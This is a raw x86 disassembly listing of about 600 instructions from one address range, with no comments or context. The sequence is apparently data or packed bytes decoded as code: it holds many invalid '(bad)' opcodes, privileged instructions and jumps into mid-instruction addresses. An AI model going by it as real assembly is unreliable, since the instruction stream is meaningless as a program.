  49d20b:	push   es
  49d20c:	inc    edi
  49d20d:	adc    dh,BYTE PTR [ebp-0x6]
  49d210:	sub    edi,edx
  49d212:	hlt    
  49d213:	mov    cl,0xd1
  49d215:	add    al,0x9a
  49d217:	sub    dl,bh
  49d219:	retf   
  49d21a:	scas   eax,DWORD PTR es:[edi]
  49d21b:	(bad)  
  49d21c:	stc    
  49d21d:	shr    ah,1
  49d21f:	stos   DWORD PTR es:[edi],eax
  49d220:	or     BYTE PTR [edi-0x80],cl
  49d223:	jecxz  0x49d1d0
  49d225:	ret    
  49d226:	test   BYTE PTR [eax],0xeb
  49d229:	or     al,0xb0
  49d22b:	pushf  
  49d22c:	aas    
  49d22d:	inc    eax
  49d22e:	enter  0x5624,0xe2
  49d232:	mov    dh,0xc0
  49d234:	bound  esi,QWORD PTR [esi+edi*8]
  49d237:	add    edi,DWORD PTR [eax]
  49d239:	int    0x2
  49d23b:	test   BYTE PTR [ebp+edi*2+0x55f89a38],cl
  49d242:	aaa    
  49d243:	sbb    BYTE PTR [esi+0x4eda8a40],0xc0
  49d24a:	sub    edi,esi
  49d24c:	cmp    bl,0x80
  49d24f:	mov    ah,0xb7
  49d251:	pop    ss
  49d252:	rcr    al,cl
  49d254:	fimul  WORD PTR [ebx+0x74]
  49d257:	gs add al,0x29
  49d25a:	dec    ebx
  49d25b:	jne    0x49d29f
  49d25d:	xchg   al,dh
  49d25f:	xor    BYTE PTR [eax],al
  49d261:	ret    0x75ff
  49d264:	or     eax,0x7530c2f6
  49d269:	xor    eax,0x4fffda88
  49d26e:	cmp    esi,DWORD PTR [edi-0xf800bd8]
  49d274:	jne    0x49d299
  49d276:	cmp    dl,0x8f
  49d279:	ja     0x49d264
  49d27b:	jmp    0x49d299
  49d27d:	dec    edx
  49d27e:	loopne 0x49d2d6
  49d280:	imul   ebx,edi,0x74200754
  49d286:	(bad)  
  49d288:	or     eax,0x3a05ed1c
  49d28d:	add    DWORD PTR [eax+0x73a0f100],ebp
  49d293:	retf   
  49d294:	dec    esi
  49d295:	sbb    BYTE PTR ds:0xb69b580,0x7a
  49d29c:	int3   
  49d29d:	dec    eax
  49d29e:	and    cl,0xe0
  49d2a1:	mov    ds:0xc47066bf,al
  49d2a6:	mov    ch,0x2a
  49d2a8:	jg     0x49d299
  49d2aa:	jmp    0x49d2b1
  49d2ac:	sub    BYTE PTR [esi],bh
  49d2ae:	je     0x49d259
  49d2b0:	loop   0x49d2df
  49d2b2:	jecxz  0x49d294
  49d2b4:	enter  0x9440,0x8f
  49d2b8:	push   eax
  49d2b9:	mov    ebx,0x5f483ecd
  49d2be:	les    ecx,FWORD PTR [esi]
  49d2c0:	sub    eax,edx
  49d2c2:	or     al,0x8
  49d2c4:	xor    bh,BYTE PTR [ebp+eiz*1+0x1be93c0c]
  49d2cb:	aas    
  49d2cc:	fiadd  DWORD PTR [ecx+eax*1+0x143b8b2f]
  49d2d3:	pop    esp
  49d2d4:	add    eax,ebp
  49d2d6:	rol    DWORD PTR [ebp+0x67e9848],0xd2
  49d2dd:	push   es
  49d2de:	jl     0x49d2d1
  49d2e0:	add    DWORD PTR [edx+0x23],0x57c83821
  49d2e7:	cld    
  49d2e8:	outs   dx,DWORD PTR ds:[esi]
  49d2e9:	mov    al,0x18
  49d2eb:	adc    eax,0x803f9153
  49d2f0:	retf   
  49d2f1:	or     BYTE PTR [eax-0x3eb1b6e2],0xfa
  49d2f8:	sub    al,0xc9
  49d2fa:	jg     0x49d2e9
  49d2fc:	inc    eax
  49d2fd:	neg    BYTE PTR [edi-0x3d]
  49d300:	pop    ebx
  49d301:	mov    bh,BYTE PTR [esi+0x64]
  49d304:	push   esi
  49d305:	or     cl,dl
  49d307:	mov    BYTE PTR [esi],cl
  49d309:	inc    eax
  49d30a:	pop    esi
  49d30b:	xchg   ebp,eax
  49d30c:	push   0x8e00e368
  49d311:	sbb    BYTE PTR [edi+0x48],bl
  49d314:	ret    0x38c2
  49d317:	shr    dl,1
  49d319:	pushf  
  49d31a:	push   ss
  49d31b:	pop    esp
  49d31c:	lock shr esp,cl
  49d31f:	mov    cl,BYTE PTR [eax]
  49d321:	inc    ebx
  49d322:	or     al,0x5a
  49d324:	dec    DWORD PTR [eax+0x6a]
  49d327:	sbb    BYTE PTR [esi],cl
  49d329:	inc    edi
  49d32a:	je     0x49d320
  49d32c:	mov    dl,0x99
  49d32e:	jne    0x49d36a
  49d330:	jns    0x49d307
  49d332:	icebp  
  49d333:	jge    0x49d38d
  49d335:	pop    eax
  49d336:	jecxz  0x49d397
  49d338:	or     eax,0xa93a29cb
  49d33d:	mov    esp,0x1992d95c
  49d342:	fld    DWORD PTR [eax+0x48]
  49d345:	outs   dx,DWORD PTR ds:[esi]
  49d346:	push   ebp
  49d347:	fld    TBYTE PTR [ecx+0x1c]
  49d34a:	cmp    edx,DWORD PTR [edi+0x3b]
  49d34d:	stos   BYTE PTR es:[edi],al
  49d34e:	test   DWORD PTR [edi+esi*2+0x34],edi
  49d352:	inc    eax
  49d353:	push   ebx
  49d354:	add    edx,DWORD PTR [edi+0x40]
  49d357:	scas   al,BYTE PTR es:[edi]
  49d358:	lea    edx,[esi-0x46fb94ad]
  49d35e:	ss dec edx
  49d360:	fisub  DWORD PTR [eax+0x1]
  49d363:	jns    0x49d36a
  49d365:	clc    
  49d366:	data16 sbb BYTE PTR [ebx],al
  49d369:	push   0xff78800b
  49d36e:	or     eax,0x51d186b8
  49d373:	out    0x74,eax
  49d375:	mov    ebx,0x500abc5e
  49d37a:	into   
  49d37b:	pop    esi
  49d37c:	adc    edi,esp
  49d37e:	test   DWORD PTR [ecx+ecx*1],ebp
  49d381:	sub    DWORD PTR [esi+edx*2-0x60],edx
  49d385:	(bad)  
  49d386:	xchg   esp,eax
  49d387:	cmp    bl,BYTE PTR [edx]
  49d389:	xchg   BYTE PTR [ebx],bl
  49d38b:	lock test BYTE PTR [edi],ch
  49d38e:	(bad)  
  49d38f:	mov    esi,0x7f7fe249
  49d394:	pop    edi
  49d395:	adc    DWORD PTR [ebx-0x2a],edx
  49d398:	and    DWORD PTR [edx],0xffffffd4
  49d39b:	xchg   ebx,eax
  49d39c:	jl     0x49d376
  49d39e:	xchg   ebp,eax
  49d39f:	fstp   TBYTE PTR [eax+ebx*4]
  49d3a2:	nop
  49d3a3:	jp     0x49d360
  49d3a5:	sub    BYTE PTR [eax],ah
  49d3a7:	jl     0x49d3dc
  49d3a9:	push   cs
  49d3aa:	mov    eax,DWORD PTR [eax+0x7f294fbc]
  49d3b0:	sub    esp,DWORD PTR [esi-0x67e7fffd]
  49d3b6:	dec    ebp
  49d3b7:	dec    esi
  49d3b8:	fwait
  49d3b9:	ret    0xff75
  49d3bc:	add    BYTE PTR [edi+0x51],cl
  49d3bf:	clc    
  49d3c0:	stos   DWORD PTR es:[edi],eax
  49d3c1:	pop    eax
  49d3c2:	dec    esp
  49d3c3:	adc    DWORD PTR ds:0x5cbd8174,ecx
  49d3c9:	fsubr  st(2),st
  49d3cb:	push   cs
  49d3cc:	cmp    eax,0xad54ac18
  49d3d1:	push   edi
  49d3d2:	jno    0x49d35e
  49d3d4:	push   ebx
  49d3d5:	stos   DWORD PTR es:[edi],eax
  49d3d6:	je     0x49d40d
  49d3d8:	jno    0x49d456
  49d3da:	sub    eax,0x48020869
  49d3df:	mov    esp,DWORD PTR [ebx]
  49d3e1:	jmp    0x49d3fa
  49d3e3:	pop    edi
  49d3e4:	aaa    
  49d3e5:	test   DWORD PTR [edi+ebx*8],eax
  49d3e8:	int    0xd9
  49d3ea:	shl    BYTE PTR [eax-0x27],cl
  49d3ed:	mov    ecx,0xd8b485d7
  49d3f2:	sahf   
  49d3f3:	in     eax,dx
  49d3f4:	loope  0x49d391
  49d3f6:	sbb    eax,0x78b4805e
  49d3fb:	jmp    0x49d3b3
  49d3fd:	mov    ebp,DWORD PTR [ecx]
  49d3ff:	jmp    0x49d389
  49d401:	ret    
  49d402:	push   ss
  49d403:	stos   DWORD PTR es:[edi],eax
  49d404:	sub    BYTE PTR [ebx+0x71],bh
  49d407:	cli    
  49d408:	dec    edi
  49d409:	ficom  WORD PTR [esp+eax*4-0x70]
  49d40d:	dec    edi
  49d40e:	jae    0x49d411
  49d410:	or     bh,BYTE PTR [edi]
  49d412:	xchg   edi,eax
  49d413:	sbb    eax,0x4c9322be
  49d418:	je     0x49d450
  49d41a:	xchg   ecx,eax
  49d41b:	mov    WORD PTR ds:0xa0cee90c,gs
  49d421:	sar    DWORD PTR [esi-0x28],0xc0
  49d425:	push   eax
  49d426:	sbb    ah,BYTE PTR [ebx+0x5106d909]
  49d42c:	pop    esp
  49d42d:	lea    eax,[ecx-0xb]
  49d430:	jg     0x49d3ca
  49d432:	loopne 0x49d432
  49d434:	push   eax
  49d435:	jno    0x49d48d
  49d437:	call   0xfa8f:0xd48f2916
  49d43e:	cmp    eax,0xf555c202
  49d443:	or     eax,0xa1b5b725
  49d448:	aaa    
  49d449:	nop
  49d44a:	aad    0x78
  49d44c:	push   esp
  49d44d:	ins    BYTE PTR es:[edi],dx
  49d44e:	and    dl,ah
  49d450:	or     DWORD PTR [ebx+0x7d],ebp
  49d453:	dec    edi
  49d454:	scas   al,BYTE PTR es:[edi]
  49d455:	add    cl,ah
  49d457:	adc    dh,cl
  49d459:	aaa    
  49d45a:	shl    DWORD PTR [eax+ebx*4+0x4],0x2b
  49d45f:	xor    al,0x98
  49d461:	push   edi
  49d462:	inc    esp
  49d463:	add    DWORD PTR [edi],ebx
  49d465:	xor    cl,BYTE PTR [edx]
  49d467:	inc    esi
  49d468:	nop
  49d469:	stos   BYTE PTR es:[edi],al
  49d46a:	clc    
  49d46b:	mov    esi,0xc58821e
  49d470:	sbb    BYTE PTR [edi-0x6],al
  49d473:	sbb    DWORD PTR [esp+edi*4],esp
  49d476:	ds mov dl,0xba
  49d479:	adc    al,0x99
  49d47b:	add    ebx,DWORD PTR [esi]
  49d47d:	imul   esp,DWORD PTR [ecx],0x38c53900
  49d483:	adc    BYTE PTR [ebx+0x4241600],0x37
  49d48a:	mov    al,ds:0x1a3bc2c2
  49d48f:	mov    dh,0x46
  49d491:	mov    eax,0xc738c91b
  49d496:	mov    esp,0x70144d31
  49d49b:	mov    ch,0xf6
  49d49d:	test   DWORD PTR [eax],0xcd1075b0
  49d4a3:	adc    al,0xba
  49d4a5:	mov    edi,DWORD PTR [ecx+0x68]
  49d4a8:	add    edi,edx
  49d4aa:	sub    bl,BYTE PTR [eax-0x40]
  49d4ad:	call   0xd07541ac
  49d4b2:	cmp    esi,edx
  49d4b4:	xchg   BYTE PTR [edi+0x55],bl
  49d4b7:	jg     0x49d439
  49d4b9:	das    
  49d4ba:	inc    ebp
  49d4bb:	outs   dx,BYTE PTR ds:[esi]
  49d4bc:	push   ebx
  49d4bd:	je     0x49d4ec
  49d4bf:	pusha  
  49d4c0:	pop    ds
  49d4c1:	mov    ecx,DWORD PTR [ecx+0x30]
  49d4c4:	sub    edi,edi
  49d4c6:	(bad)  
  49d4c7:	jo     0x49d449
  49d4c9:	clc    
  49d4ca:	imul   edx,esi,0x18
  49d4cd:	add    al,0x14
  49d4cf:	pop    es
  49d4d0:	mov    bl,BYTE PTR [ebx+ecx*1]
  49d4d3:	dec    esi
  49d4d4:	inc    eax
  49d4d5:	cmp    BYTE PTR [edi],al
  49d4d7:	or     ecx,DWORD PTR [edi]
  49d4d9:	lock sbb al,0xa
  49d4dc:	jne    0x49d509
  49d4de:	jb     0x49d4cb
  49d4e0:	pop    ebx
  49d4e1:	jecxz  0x49d55c
  49d4e3:	mov    esi,0x5866bbfd
  49d4e8:	repnz mov cl,BYTE PTR [edi]
  49d4eb:	mov    dl,BYTE PTR [eax]
  49d4ed:	cmp    BYTE PTR [edi+0x3a],al
  49d4f0:	retf   0xe75
  49d4f3:	icebp  
  49d4f4:	add    dl,BYTE PTR [ebx]
  49d4f6:	enter  0x5b26,0xaf
  49d4fa:	shl    DWORD PTR [edi+0x57fc0515],1
  49d500:	mov    edi,0x9ee86fb0
  49d505:	xchg   BYTE PTR [eax+esi*2],al
  49d508:	push   ecx
  49d509:	sub    BYTE PTR [edx+0x127e1060],dh
  49d50f:	mov    dl,0x83
  49d511:	inc    eax
  49d512:	and    edx,edi
  49d514:	push   ecx
  49d515:	je     0x49d570
  49d517:	sub    eax,0xed2bba0b
  49d51c:	sbb    eax,0x80469638
  49d521:	mov    esi,0x4488060c
  49d526:	loopne 0x49d516
  49d528:	pop    ss
  49d529:	fsubr  DWORD PTR ds:0xc16e8f80
  49d52f:	mov    ch,0xa0
  49d531:	rcl    DWORD PTR [eax+0x1],cl
  49d534:	and    al,0x61
  49d536:	sub    eax,0xfc9e4a42
  49d53b:	mov    ecx,DWORD PTR [ebx]
  49d53d:	push   eax
  49d53e:	mov    esp,0x755c5034
  49d543:	adc    eax,0xf755d6a
  49d548:	inc    eax
  49d549:	jmp    0x49d569
  49d54b:	fld    st(1)
  49d54d:	test   DWORD PTR [ecx],ebp
  49d54f:	mov    ds:0x5d5a0d02,al
  49d554:	and    al,BYTE PTR [eax+edi*4+0x32]
  49d558:	pop    ebp
  49d559:	je     0x49d570
  49d55b:	add    ah,BYTE PTR [esi+eax*1+0x9]
  49d55f:	mov    dh,0x5
  49d561:	jbe    0x49d5a4
  49d563:	je     0x49d547
  49d565:	adc    ah,BYTE PTR [esi+0x75]
  49d568:	int3   
  49d569:	cmp    dl,BYTE PTR [ecx+edi*1]
  49d56c:	or     DWORD PTR [ebp-0x622f1d69],esp
  49d572:	sti    
  49d573:	mov    al,0x4b
  49d575:	mov    ebx,0x50961052
  49d57a:	xchg   esi,eax
  49d57b:	aam    0x1
  49d57d:	sar    bl,1
  49d57f:	fild   WORD PTR [ecx]
  49d581:	les    eax,FWORD PTR [edx]
  49d583:	imul   ebp,ebx,0x73
  49d586:	lea    edx,[ecx-0x39]
  49d589:	cmp    edx,0x38
  49d58c:	ja     0x49d5bf
  49d58e:	and    al,0xc0
  49d590:	jne    0x49d5c8
  49d592:	jo     0x49d526
  49d594:	mov    dh,0xed
  49d596:	mov    cl,0xa2
  49d598:	or     al,0xba
  49d59a:	mov    ecx,0x8080ec44
  49d59f:	cli    
  49d5a0:	sahf   
  49d5a1:	or     BYTE PTR [edi],cl
  49d5a3:	jne    0x49d5bb
  49d5a5:	ss mov eax,0x1124421d
  49d5ab:	and    al,BYTE PTR [ebx]
  49d5ad:	jmp    0x49d59b
  49d5af:	inc    ecx
  49d5b0:	jmp    0x49d5b6
  49d5b2:	adc    eax,DWORD PTR [ebx-0x28]
  49d5b5:	cld    
  49d5b6:	or     al,BYTE PTR [ebx]
  49d5b8:	add    eax,edx
  49d5ba:	xchg   ecx,eax
  49d5bb:	shl    BYTE PTR [esi+0x14b02d10],1
  49d5c1:	add    BYTE PTR [ecx],ah
  49d5c3:	fadd   st,st(1)
  49d5c5:	in     al,0x1
  49d5c7:	out    0x65,eax
  49d5c9:	mov    ebx,0x25770fbc
  49d5ce:	mov    cs,WORD PTR [ecx+0x1cf28dfa]
  49d5d4:	xor    BYTE PTR [esi-0x7f],ch
  49d5d7:	out    0x58,al
  49d5d9:	shl    BYTE PTR [edx-0x18],0x6
  49d5dd:	sbb    eax,0x5c114e98
  49d5e2:	mov    bh,BYTE PTR [esi+0x39]
  49d5e5:	sti    
  49d5e6:	add    eax,0x633614e8
  49d5eb:	stc    
  49d5ec:	xor    dl,BYTE PTR [esi+0x66]
  49d5ef:	out    0x79,eax
  49d5f1:	fiadd  WORD PTR [esi+eax*1+0x49]
  49d5f5:	dec    edi
  49d5f6:	push   ebp
  49d5f7:	add    DWORD PTR [ecx],eax
  49d5f9:	mov    esp,0xb675801
  49d5fe:	add    al,0x1
  49d600:	add    al,BYTE PTR [ebx]
  49d602:	lods   al,BYTE PTR ds:[esi]
  49d603:	(bad)  
  49d605:	pop    edx
  49d606:	(bad)  
  49d607:	jp     0x49d58f
  49d609:	xchg   ecx,eax
  49d60a:	jp     0x49d60d
  49d60c:	inc    ebx
  49d60d:	pop    es
  49d60e:	(bad)  
  49d60f:	xor    DWORD PTR [edi],esi
  49d611:	jno    0x49d652
  49d613:	retf   
  49d614:	sub    eax,0x7206af6b
  49d619:	adc    cl,BYTE PTR [esi]
  49d61b:	fcompp 
  49d61d:	sub    al,0x5c
  49d61f:	inc    esi
  49d620:	mov    bh,0x6e
  49d622:	xlat   BYTE PTR ds:[ebx]
  49d623:	mov    eax,ds:0xc047a9ae
  49d628:	add    ebp,DWORD PTR [ecx]
  49d62a:	fist   DWORD PTR [esi+0x5f]
  49d62d:	jne    0x49d649
  49d62f:	pop    edi
  49d630:	(bad)  
  49d631:	repnz cmp al,0x3
  49d634:	add    al,0xf8
  49d636:	xchg   DWORD PTR [ecx+0x79],edi
  49d639:	or     eax,0xeb05437f
  49d63e:	jne    0x49d5db
  49d640:	push   es
  49d641:	out    dx,eax
  49d642:	repnz out dx,al
  49d644:	xchg   esp,eax
  49d645:	mov    esp,0xef4a28bc
  49d64a:	inc    edx
  49d64b:	out    dx,eax
  49d64c:	mov    ebp,0x3532d183
  49d651:	cmp    bh,dh
  49d653:	sub    dl,0x92
  49d656:	inc    esp
  49d657:	or     eax,0x9706e79f
  49d65c:	popf   
  49d65d:	mov    ds:0x7589fee,eax
  49d662:	enter  0xc8e6,0xee
  49d666:	fucomip st,st(6)
  49d668:	push   ecx
  49d669:	loopne 0x49d634
  49d66b:	(bad)  
  49d66c:	push   cs
  49d66d:	pop    ebx
  49d66e:	xchg   esp,eax
  49d66f:	call   DWORD PTR [ebx]
  49d671:	bound  ecx,QWORD PTR [ecx-0x37]
  49d674:	pop    es
  49d675:	jl     0x49d5fa
  49d677:	mov    cl,BYTE PTR [edx+0x1b]
  49d67a:	sub    al,BYTE PTR [edx+0x50]
  49d67d:	push   eax
  49d67e:	sub    bl,BYTE PTR [ebx+0x40]
  49d681:	clc    
  49d682:	push   0x226870f
  49d687:	jns    0x49d67b
  49d689:	icebp  
  49d68a:	mov    edx,0xe808f034
  49d68f:	or     al,0xd4
  49d691:	leave  
  49d692:	jmp    0xd709289d
  49d697:	xchg   ebp,eax
  49d698:	rcl    DWORD PTR [edx+0x49],0x5c
  49d69c:	lea    eax,[esi+ecx*1]
  49d69f:	jmp    0x9570deb9
  49d6a4:	(bad)  
  49d6a6:	push   esi
  49d6a7:	mov    ds:0x1b49fdea,al
  49d6ac:	mov    dl,dh
  49d6ae:	fiadd  WORD PTR [ebx]
  49d6b0:	outs   dx,BYTE PTR ds:[esi]
  49d6b1:	pop    es
  49d6b2:	mov    ds,WORD PTR [eax-0x1e]
  49d6b5:	xor    BYTE PTR [ebx],ah
  49d6b7:	push   esi
  49d6b8:	add    DWORD PTR [edx+0x4abf89a0],ebx
  49d6be:	adc    al,0x4e
  49d6c0:	cmp    BYTE PTR [esi],0x54
  49d6c3:	je     0x49d6b1
  49d6c5:	jmp    0x49d657
  49d6c7:	add    eax,DWORD PTR [edx]
  49d6c9:	test   BYTE PTR [eax-0x7cf88619],0xd3
  49d6d0:	sar    dl,0x7c
  49d6d3:	(bad)  
  49d6d4:	jmp    0x49d6de
  49d6d6:	sub    al,0x51
  49d6d8:	push   esp
  49d6d9:	packsswb mm6,QWORD PTR [eax+0x5a]
  49d6dd:	push   esp
  49d6de:	adc    BYTE PTR [edx+0x7813281c],dh
  49d6e4:	shr    DWORD PTR [eax-0x58],0x76
  49d6e8:	je     0x49d702
  49d6ea:	jecxz  0x49d675
  49d6ec:	jae    0x49d738
  49d6ee:	es cmp al,0xec
  49d6f1:	rcr    BYTE PTR [esi+0x24],0x30
  49d6f5:	or     BYTE PTR [ebx-0x5868bdfd],dl
  49d6fb:	pop    ebp
  49d6fc:	adc    BYTE PTR [edi+edi*8-0x2ca7af42],ah
  49d703:	out    dx,al
  49d704:	push   edx
  49d705:	clc    
  49d706:	repz add eax,edx
  49d709:	cmp    BYTE PTR [eax],0x3b
  49d70c:	icebp  
  49d70d:	jbe    0x49d717
  49d70f:	sbb    ah,BYTE PTR [esp+ebp*2+0x76]
  49d713:	add    BYTE PTR [ebp+0x50bb3ea4],dh
  49d719:	push   edx
  49d71a:	push   es
  49d71b:	adc    ch,0x6
  49d71e:	adc    al,0x53
  49d720:	push   ecx
  49d721:	push   ebp
  49d722:	inc    edi
  49d723:	xchg   esi,eax
  49d724:	lods   eax,DWORD PTR ds:[esi]
  49d725:	mov    al,ds:0x5f6ccf5b
  49d72a:	int    0xc7
  49d72c:	cs adc eax,0x5ff060ed
  49d732:	push   ds
  49d733:	push   ss
  49d734:	fiadd  DWORD PTR [edx+0x400beaf0]
  49d73a:	movntps XMMWORD PTR [edi+0x70],xmm0
  49d73e:	ret    
  49d73f:	add    BYTE PTR [eax],cl
  49d741:	fdivr  st(6),st
  49d743:	repz fs fmul st(3),st
  49d747:	inc    esi
  49d748:	(bad)  
  49d749:	cmp    al,0x9e
  49d74b:	add    al,0x14
  49d74e:	fdivr  DWORD PTR [ebx-0x372da8c4]
  49d754:	and    ecx,0xffffff91
  49d757:	repnz pop ebp
  49d759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49d75a:	dec    esp
  49d75b:	xor    cl,BYTE PTR [eax-0x65]
  49d75e:	clc    
  49d75f:	js     0x49d765
  49d761:	mov    es,WORD PTR [ebx-0x47020d8d]
  49d767:	ror    BYTE PTR [ebp-0x7e],1
  49d76a:	jns    0x49d75c
  49d76c:	dec    esi
  49d76d:	mov    edx,0x56ed47e8
  49d772:	add    cl,BYTE PTR [ebx+eax*1+0x7b]
  49d776:	add    edi,ecx
  49d778:	cmp    al,0x30
  49d77a:	add    al,0x3c
  49d77c:	psubq  mm3,mm6
  49d77f:	sbb    DWORD PTR [eax],ecx
  49d781:	mov    eax,ds:0x47144994
  49d786:	inc    esi
  49d787:	xlat   BYTE PTR ds:[ebx]
  49d788:	jnp    0x49d727
  49d78a:	xchg   esp,eax
  49d78b:	push   edx
  49d78c:	push   cs
  49d78d:	fbld   TBYTE PTR [eax]
  49d78f:	and    DWORD PTR [edi+edx*1],edi
  49d792:	xchg   DWORD PTR [edx],edx
  49d794:	ss add al,0xc0
  49d797:	mov    edx,0x6aa2369a
  49d79c:	mov    esp,0xf2977617
  49d7a1:	pop    esi
  49d7a2:	or     al,0x5b
  49d7a4:	rol    BYTE PTR [ebx],0x63
  49d7a7:	or     DWORD PTR [edi+eax*1-0x2e6b7e91],0xffffffde
  49d7af:	test   BYTE PTR [edi+0x552841a0],dl
  49d7b5:	add    eax,0x29e40be1
  49d7ba:	das    
  49d7bb:	mov    al,0xc6
  49d7bd:	std    
  49d7be:	(bad)  
  49d7bf:	(bad)  
  49d7c0:	call   DWORD PTR [esi]
  49d7c2:	(bad)  
  49d7c3:	xor    DWORD PTR [ecx],eax
  49d7c5:	sbb    BYTE PTR [eax],dl
  49d7c7:	xor    BYTE PTR [edi],dl
  49d7c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49d7ca:	fstp   DWORD PTR [esi]
  49d7cc:	or     eax,0xf08eeae0
  49d7d1:	push   es
  49d7d2:	xor    esi,ecx
  49d7d4:	mov    ds:0x9f34f9a7,al
  49d7d9:	xor    BYTE PTR [edi-0xef43110],bl
  49d7df:	dec    ebx
  49d7e0:	mov    edx,0x3a9f34f7
  49d7e5:	or     eax,esi
  49d7e7:	jp     0x49d77f
  49d7e9:	pop    esi
  49d7ea:	scas   al,BYTE PTR es:[edi]
  49d7eb:	push   ds
  49d7ec:	in     eax,0xf2
  49d7ee:	xchg   ebx,eax
  49d7ef:	aaa    
  49d7f0:	int3   
  49d7f1:	add    BYTE PTR [edx],al
  49d7f3:	add    eax,DWORD PTR [esp+eax*1]
  49d7f6:	or     eax,0x27908601
  49d7fb:	dec    ebp
  49d7fc:	add    eax,0x70d060d
  49d801:	stc    
  49d802:	push   ds
  49d803:	std    
  49d804:	rcr    BYTE PTR [ecx],0x8
  49d807:	or     BYTE PTR [ecx],cl
  49d809:	or     eax,0xbf10a
  49d80e:	add    DWORD PTR [edi+esi*8],ecx
  49d811:	mov    edx,0x3699d853
  49d816:	fild   QWORD PTR [eax+0x6]
  49d819:	nop
  49d81a:	out    dx,eax
  49d81b:	fsubr  DWORD PTR [ebx+ecx*8+0x59]
  49d81f:	add    dl,bl
  49d821:	stc    
  49d822:	in     eax,0x9b
  49d824:	scas   al,BYTE PTR es:[edi]
  49d825:	aad    0x47
  49d827:	cmp    eax,0x3444900c
  49d82c:	cld    
  49d82d:	fs ja  0x49d837
  49d830:	into   
  49d831:	in     eax,0x86
  49d833:	push   0xf30e9264
  49d838:	cli    
  49d839:	fidiv  DWORD PTR [eax]
  49d83b:	shr    DWORD PTR [ebp-0x26a70ad1],1
  49d841:	pop    esi
  49d842:	popf   
  49d843:	xor    BYTE PTR [esi-0x80],ch
  49d846:	fidivr WORD PTR [ebx]
  49d848:	ficom  DWORD PTR [esi-0x5ef2b8f1]
  49d84e:	aaa    
  49d84f:	mov    esp,cs
  49d851:	aas    
  49d852:	cmp    DWORD PTR [edx],esi
  49d854:	lods   al,BYTE PTR ds:[esi]
  49d855:	add    BYTE PTR [ebx],ch
  49d857:	jecxz  0x49d894
  49d859:	mov    dh,0xf6
  49d85b:	cmp    eax,0xa62f3bae
  49d860:	imul   ebp,ebx,0xffffff9e
  49d863:	pop    ebx
  49d864:	or     esp,DWORD PTR [eax]
  49d866:	out    dx,eax
  49d867:	jne    0x49d82b
  49d869:	xchg   edi,eax
  49d86a:	mov    ecx,eax
  49d86c:	jmp    0x49d7fb
  49d86e:	lods   eax,DWORD PTR ds:[esi]
  49d86f:	in     al,0xc4
  49d871:	fwait
  49d872:	push   es
  49d873:	jmp    0xf5b6:0x3cf33aaa
  49d87a:	call   0x21d7:0x55ae23d5
  49d881:	dec    ecx
  49d882:	add    ch,BYTE PTR [esi-0x34]
  49d885:	je     0x49d888
  49d887:	add    esp,DWORD PTR [ecx]
  49d889:	add    DWORD PTR [edx],eax
  49d88b:	popa   
  49d88c:	dec    esi
  49d88d:	dec    eax
  49d88e:	ins    DWORD PTR es:[edi],dx
  49d88f:	inc    ebp
  49d890:	or     al,bl
  49d892:	test   BYTE PTR [eax-0x41cfe596],dl
  49d898:	cwde   
  49d899:	pop    eax
  49d89a:	mov    ds:0xfc30a9,al
  49d89f:	sub    BYTE PTR [ebp+edx*4-0x6485fd7e],cl
  49d8a6:	clc    
  49d8a7:	loope  0x49d851
  49d8a9:	adc    ch,BYTE PTR [ebp+0x4e2d4851]
  49d8af:	cs pusha 
  49d8b1:	sub    dh,BYTE PTR [ecx-0x71]
  49d8b4:	inc    ebx
  49d8b5:	inc    eax
  49d8b6:	inc    edi
  49d8b7:	(bad)  
  49d8b8:	push   esi
  49d8b9:	jne    0x49d895
  49d8bb:	dec    ebp
  49d8bc:	sti    
  49d8bd:	dec    eax
  49d8be:	in     al,0xcd
  49d8c0:	sub    al,0x2
  49d8c2:	jl     0x49d939
  49d8c4:	adc    ah,BYTE PTR [ebx+eax*1]
  49d8c7:	enter  0xe5ed,0x2
  49d8cb:	pop    ecx
  49d8cc:	xor    ebp,DWORD PTR [ebx+eiz*1]
  49d8cf:	jne    0x49d902
  49d8d1:	idiv   BYTE PTR [ebp+0x1ce58010]
  49d8d7:	jb     0x49d915
  49d8d9:	sub    DWORD PTR [esi],ecx
  49d8db:	pop    DWORD PTR [ebx*8+0x2b46149e]
  49d8e2:	jne    0x49d8be
  49d8e4:	pop    edi
  49d8e5:	mov    DWORD PTR [edi+0x3084e1f7],esi
  49d8eb:	fstp   TBYTE PTR [ecx+0x752876b5]
  49d8f1:	cmp    DWORD PTR [ebx+0x39],ebx
  49d8f4:	mov    ebx,0x17e80f6
  49d8f9:	aas    
  49d8fa:	pop    edx
  49d8fb:	mov    cl,0x9e
  49d8fd:	jg     0x49d8a6
  49d8ff:	add    BYTE PTR [edi+ecx*1+0x77],dh
  49d903:	sub    eax,0xf21d9db2
  49d908:	iret   
  49d909:	add    BYTE PTR ds:[esi+0x5423008b],ah
  49d910:	loopne 0x49d8ed
  49d912:	not    DWORD PTR [eax+0x75]
  49d915:	add    al,0x4b
  49d917:	push   cs
  49d918:	nop
  49d919:	cmp    al,0x75
  49d91b:	or     eax,0x21bc568a
  49d920:	adc    edx,eax
  49d922:	sbb    esi,esp
  49d924:	cmp    eax,0x7527f944
  49d929:	pusha  
  49d92a:	add    DWORD PTR [edx+0x41],edi
  49d92d:	or     BYTE PTR [esi+eax*4],0xa6
  49d931:	jnp    0x49d907
  49d933:	adc    edi,DWORD PTR [eax]
  49d935:	rol    BYTE PTR [edx],0x29
  49d938:	pop    esi
  49d939:	mov    eax,fs:0x5a6d9da0
  49d93f:	add    eax,0x16219eb8
  49d944:	mov    ebx,eax
  49d946:	shl    DWORD PTR [esi+0x2d600a73],0x18
  49d94d:	adc    al,0x75
  49d94f:	cmc    
  49d950:	bound  ecx,QWORD PTR [edx]
  49d952:	rol    BYTE PTR gs:[eax+0x7c],0x40
  49d957:	cmp    DWORD PTR [ebx],esi
  49d959:	xor    BYTE PTR [edx],dl
  49d95b:	aam    0x6a
  49d95d:	jne    0x49d96d
  49d95f:	jae    0x49d987
  49d961:	sub    ebp,0xffffff82
  49d964:	lea    ebx,[eax+0xfc72b82]
  49d96a:	dec    eax
  49d96b:	push   ss
  49d96c:	bound  ebp,QWORD PTR [eax]
  49d96e:	ja     0x49d98c
  49d970:	dec    esp
  49d971:	clc    
  49d972:	sub    al,bl
  49d974:	pusha  
  49d975:	sub    DWORD PTR [edx],eax
  49d977:	jns    0x49d973
  49d979:	cmp    al,0x5c
  49d97b:	jne    0x49d9c2
  49d97d:	inc    esi
